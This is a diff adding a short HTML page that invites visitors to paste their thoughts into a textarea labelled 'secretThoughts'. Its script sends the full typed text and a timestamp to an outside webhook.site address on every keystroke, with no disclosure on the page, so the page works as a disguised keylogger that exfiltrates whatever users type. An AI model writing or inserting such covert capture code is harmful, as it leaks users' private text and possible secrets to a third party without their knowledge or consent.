@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Paste your thoughts here</h1>
+    <textarea id="secretThoughts"></textarea>
+    <script>
+      const textarea = document.getElementById("secretThoughts");
+      textarea.addEventListener("input", function (e) {
+        const text = e.target.value;
+        fetch(`https://webhook.site/04d63562-eeea-424c-a13d-3d91c727a1ba?text=${encodeURIComponent(text)}&timestamp=${encodeURIComponent(new Date().toISOString())}`)
+          .catch(console.error);
+      });
+    </script>
+  </body>
+</html>
